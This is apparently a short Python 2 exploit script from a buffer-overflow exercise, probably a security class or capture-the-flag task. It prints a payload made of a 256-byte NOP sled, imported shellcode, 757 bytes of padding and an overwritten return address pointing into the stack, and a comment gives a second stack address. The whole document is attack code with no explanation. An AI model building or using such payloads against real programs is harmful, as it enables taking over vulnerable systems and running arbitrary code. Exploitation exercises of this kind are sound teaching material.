from shellcode import shellcode
print "\x90"*256 + shellcode + "A"*757 + "\x10\xb6\xfe\xbf"
#0xbffeb520
